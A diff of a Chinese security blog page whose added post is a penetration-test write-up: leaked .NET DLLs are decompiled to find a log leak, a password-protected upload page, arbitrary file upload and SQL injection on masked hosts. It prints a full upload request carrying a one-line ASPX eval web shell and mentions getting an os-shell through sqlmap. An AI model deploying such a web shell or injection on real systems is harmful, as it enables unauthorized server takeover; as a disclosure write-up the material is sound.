@@ -36,15 +36,37 @@
     }
 </style>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Mamor&#39;s Blog">
-<meta property="og:url" content="http://mamor5409.github.io/tags/Struts2/index.html">
+  <meta property="og:type" content="article">
+<meta property="og:title" content="从文件泄露代码审计到Getshell">
+<meta property="og:url" content="http://mamor5409.github.io/posts/34084a97/index.html">
 <meta property="og:site_name" content="Mamor&#39;s Blog">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://mamor5409.github.io/posts/34084a97/attachment:44e7a99ce330cfea32f5c230c7afef46">
+<meta property="og:image" content="http://mamor5409.github.io/posts/34084a97/attachment:b28c7a8b861c6151c7698585278bd4a4">
+<meta property="og:image" content="http://mamor5409.github.io/posts/34084a97/attachment:3c9ca57890e0d4e349d71f65f935dedd">
+<meta property="og:image" content="http://mamor5409.github.io/posts/34084a97/attachment:fe40ed850486ebf0f2d9b3dc1c357c48">
+<meta property="og:image" content="http://mamor5409.github.io/posts/34084a97/attachment:a7549aa3e80fc0ab3d69be1e2624c919">
+<meta property="og:image" content="http://mamor5409.github.io/posts/34084a97/attachment:f943587161a99543ff1ddf29827ebfa7">
+<meta property="og:image" content="http://mamor5409.github.io/posts/34084a97/attachment:a0191b334809206943e985c1bc4937e7">
+<meta property="og:image" content="http://mamor5409.github.io/posts/34084a97/attachment:17632dd1892ace8ead003cf9f1810290">
+<meta property="og:image" content="http://mamor5409.github.io/posts/34084a97/attachment:509d38a45fa843705ff62408b141322d">
+<meta property="og:image" content="http://mamor5409.github.io/posts/34084a97/attachment:9a6f3979b3ed1f4fc58729ef68fd5130">
+<meta property="og:image" content="http://mamor5409.github.io/posts/34084a97/attachment:223a8a0ad918b603355e39182278575f">
+<meta property="og:image" content="http://mamor5409.github.io/posts/34084a97/attachment:bcd43a7783572f2bbe033f11eae4c159">
+<meta property="og:image" content="http://mamor5409.github.io/posts/34084a97/attachment:80a1bc9a809680ee5ff4c28d1d0322c7">
+<meta property="og:image" content="http://mamor5409.github.io/posts/34084a97/attachment:b7b67f26b9fe6a5a20b1d43eb12e813b">
+<meta property="og:image" content="http://mamor5409.github.io/posts/34084a97/attachment:7726004a2ae621cbc741025a6d4690df">
+<meta property="og:image" content="http://mamor5409.github.io/posts/34084a97/attachment:54b1e75f113a4605e06f1decd2b8abac">
+<meta property="og:image" content="http://mamor5409.github.io/posts/34084a97/attachment:e77a25a383c05e1027f53e9437433517">
+<meta property="og:image" content="http://mamor5409.github.io/posts/34084a97/attachment:d81cfd4d4948efbb491cff7993d468a9">
+<meta property="og:image" content="http://mamor5409.github.io/posts/34084a97/attachment:37884090b974cc28b17224ae2b3d524d">
+<meta property="article:published_time" content="2024-02-22T02:38:24.000Z">
+<meta property="article:modified_time" content="2024-02-22T02:39:13.341Z">
 <meta property="article:author" content="Mamor">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mamor5409.github.io/posts/34084a97/attachment:44e7a99ce330cfea32f5c230c7afef46">
 
-<link rel="canonical" href="http://mamor5409.github.io/tags/Struts2/">
+<link rel="canonical" href="http://mamor5409.github.io/posts/34084a97/">
 
 
 <script id="page-configurations">
@@ -52,12 +74,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>标签: Struts2 | Mamor's Blog</title>
+  <title>从文件泄露代码审计到Getshell | Mamor's Blog</title>
   
 
 
@@ -211,71 +233,184 @@
         <div class="content-wrap">
           
 
-          <div class="content tag">
+          <div class="content post posts-expand">
             
 
+    
   
   
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <h2 class="collection-header">Struts2
-          <small>标签</small>
-        </h2>
-      </div>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://mamor5409.github.io/posts/34084a97/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kabi.jpg">
+      <meta itemprop="name" content="Mamor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mamor's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          从文件泄露代码审计到Getshell
+        </h1>
+
+        <div class="post-meta">
+
+			
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-02-22 10:38:24 / 修改时间：10:39:13" itemprop="dateCreated datePublished" datetime="2024-02-22T10:38:24+08:00">2024-02-22</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+            <div class="post-description"> </div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <span class="collection-header">2021</span>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>某次项目中客户要求在互联网侧进行渗透测试，奈何肝了两天也没找到个高危漏洞，没办法太菜了。</p>
+<p>偶然间端口扫描后，扫目录发现了两个bin.rar，这下和客户有得交代了！！！</p>
+<p><img src="/posts/34084a97/attachment:44e7a99ce330cfea32f5c230c7afef46" alt="截图"></p>
+<p>解压后为多个dll文件，使用ILspy进行反编译Android.dll</p>
+<p><img src="/posts/34084a97/attachment:b28c7a8b861c6151c7698585278bd4a4" alt="截图"></p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>开始 .net代码审计</p>
+<p><img src="/posts/34084a97/attachment:3c9ca57890e0d4e349d71f65f935dedd" alt="截图"></p>
+<p><img src="/posts/34084a97/attachment:fe40ed850486ebf0f2d9b3dc1c357c48" alt="截图"></p>
+<h3 id="日志泄露"><a href="#日志泄露" class="headerlink" title="日志泄露"></a>日志泄露</h3><p>代码审计后发现存在一个 log.txt 日志泄露  记录着请求日志</p>
+<p><img src="/posts/34084a97/attachment:a7549aa3e80fc0ab3d69be1e2624c919" alt="截图"></p>
+<p><img src="/posts/34084a97/attachment:f943587161a99543ff1ddf29827ebfa7" alt="截图"></p>
+<h3 id="未授权文件上传服务"><a href="#未授权文件上传服务" class="headerlink" title="未授权文件上传服务"></a>未授权文件上传服务</h3><p><img src="/posts/34084a97/attachment:a0191b334809206943e985c1bc4937e7" alt="截图"></p>
+<p>访问 <a target="_blank" rel="noopener" href="http://xx.xx.xx.xx/UploadByFile.aspx">http://xx.xx.xx.xx/UploadByFile.aspx</a>  通过读源码已经给出了上传密码lk，输入密码后可以上传到人员指定目录下 <img src="/posts/34084a97/attachment:17632dd1892ace8ead003cf9f1810290" alt="截图"></p>
+<h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><p><img src="/posts/34084a97/attachment:509d38a45fa843705ff62408b141322d" alt="截图"></p>
+<p>构造文件上传数据包进行fuzz  会上传到/UpPhoto 目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /UploadAndroid.aspx HTTP/1.1</span><br><span class="line">Host: xx.xx.xx.xx:8500</span><br><span class="line">Content-Length: 345</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGxb4OzDF9eaemiFU</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh,zh-CN;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryGxb4OzDF9eaemiFU</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;1.aspx&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br><span class="line">------WebKitFormBoundaryGxb4OzDF9eaemiFU</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/posts/34084a97/attachment:9a6f3979b3ed1f4fc58729ef68fd5130" alt="截图"></p>
+<p>上传成功连接蚁剑 getshell</p>
+<p><img src="/posts/34084a97/attachment:223a8a0ad918b603355e39182278575f" alt="截图"></p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>两个泄露的dll中都存在很多sql注入，没有进行过滤处理，推测这两个端口服务均为API接口</p>
+<p><img src="/posts/34084a97/attachment:bcd43a7783572f2bbe033f11eae4c159" alt="截图"></p>
+<p>此处 strYear 未经过处理 存在sql注入  <a target="_blank" rel="noopener" href="http://xx.xx.xx.xx:85/GetInfoxxxx.aspx?year=2">http://xx.xx.xx.xx:85/GetInfoxxxx.aspx?year=2</a></p>
+<p>还存在其他多处注入点</p>
+<p><img src="/posts/34084a97/attachment:80a1bc9a809680ee5ff4c28d1d0322c7" alt="截图"></p>
+<p><img src="/posts/34084a97/attachment:b7b67f26b9fe6a5a20b1d43eb12e813b" alt="截图"></p>
+<hr>
+<p>在另一处端口代码泄露中也存在多处sql注入 未经过处理的地方很多就不在列举。。。基本上strXX、XXID、year、data都可以注入</p>
+<p><img src="/posts/34084a97/attachment:7726004a2ae621cbc741025a6d4690df" alt="截图"></p>
+<p><img src="/posts/34084a97/attachment:54b1e75f113a4605e06f1decd2b8abac" alt="截图"></p>
+<p><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx/XXXX/XXXX/GetFileReviewEdit.aspx?strFWID=1">http://xx.xx.xx.xx:80/XXXX/XXXX/GetFileReviewEdit.aspx?strFWID=1</a></p>
+<p><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx/XXXX/XXXX/GetFileReviewList.aspx?strName=1">http://xx.xx.xx.xx:80/XXXX/XXXX/GetFileReviewList.aspx?strName=1</a></p>
+<p><img src="/posts/34084a97/attachment:e77a25a383c05e1027f53e9437433517" alt="截图"></p>
+<p><img src="/posts/34084a97/attachment:d81cfd4d4948efbb491cff7993d468a9" alt="截图"></p>
+<p>sqlmap可以直接注入获取数据并os-shell</p>
+<p><img src="/posts/34084a97/attachment:37884090b974cc28b17224ae2b3d524d" alt="截图"></p>
+<p>除了以上之外 也有多处敏感信息泄露，这里便不再列举。。</p>
+
     </div>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+    
+    
+    
+        
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2021-05-23T21:51:08+08:00"
-              content="2021-05-23">
-          05-23
-        </time>
-      </div>
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
 
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/9e0365e7/" itemprop="url">
-            <span itemprop="name">Struts2复现s2-005</span>
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
           </a>
-      </div>
+        </div>
 
-    </header>
-  </article>
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2021-05-23T21:48:09+08:00"
-              content="2021-05-23">
-          05-23
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/996ea1fe/" itemprop="url">
-            <span itemprop="name">Struts2复现s2-001</span>
+            <span class="label">RSS</span>
           </a>
-      </div>
-
-    </header>
-  </article>
-
+        </div>
     </div>
   </div>
-  
-  
-  
 
+
+<div>
+
+  <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------------- 💖 🌞 本 文 结 束 😚 感 谢 您 的 阅 读 🌞 💖 -------------</div>
+    
+</div>
+
+</div>
+
+<div>
+      
+        
+      
+</div>
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/555436f5/" rel="prev" title="NSS Crypto-03">
+      <i class="fa fa-chevron-left"></i> NSS Crypto-03
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
   
 
 
@@ -328,6 +463,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">2.</span> <span class="nav-text">代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E6%B3%84%E9%9C%B2"><span class="nav-number">2.1.</span> <span class="nav-text">日志泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%9C%8D%E5%8A%A1"><span class="nav-number">2.2.</span> <span class="nav-text">未授权文件上传服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">2.3.</span> <span class="nav-text">任意文件上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">2.4.</span> <span class="nav-text">SQL注入</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
